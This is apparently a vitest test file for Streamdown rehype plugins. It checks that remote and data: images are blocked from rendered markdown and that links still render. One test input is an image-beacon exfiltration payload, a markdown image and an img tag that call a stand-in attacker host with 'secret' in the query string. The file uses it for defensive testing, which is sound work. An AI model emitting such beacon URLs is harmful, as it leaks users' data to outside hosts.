import { createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import { Streamdown } from 'streamdown'
import { describe, expect, it } from 'vitest'
import { streamdownRehypePlugins } from './streamdown'

function render(markdown: string): string {
  return renderToStaticMarkup(
    createElement(Streamdown, { mode: 'static', rehypePlugins: streamdownRehypePlugins }, markdown),
  )
}

describe('streamdownRehypePlugins', () => {
  it('blocks remote and data: images', () => {
    const html = render(
      '![a](https://attacker.example/beacon?q=secret) <img src="https://attacker.example/x.png"> ![b](data:image/png;base64,AAAA)',
    )
    expect(html).not.toContain('<img')
    expect(html).not.toContain('attacker.example')
    expect(html).toContain('[Image blocked: a]')
  })

  it('still renders links', () => {
    expect(render('[docs](https://antseed.com/docs)')).toContain('data-streamdown="link"')
  })
})
